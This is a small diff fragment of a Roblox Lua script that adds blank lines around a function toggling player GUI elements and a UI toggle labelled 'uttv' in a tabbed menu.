@@ -1596,6 +1106,8 @@ Tabs.playergui:Section({
 
 local PlayerGui = game:GetService("Players").LocalPlayer.PlayerGui
 if game:GetService("Players").LocalPlayer:FindFirstChild("UnlockData") then
+
+
     local function toggleGuiElement(Element)
         local targetParent = PlayerGui:FindFirstChild("003-A")
         local element = PlayerGui:FindFirstChild(Element)
@@ -1613,6 +1125,7 @@ if game:GetService("Players").LocalPlayer:FindFirstChild("UnlockData") then
             element.Parent = PlayerGui
         end
     end
+
 
     Tabs.playergui:Toggle({
         Title = "uttv",
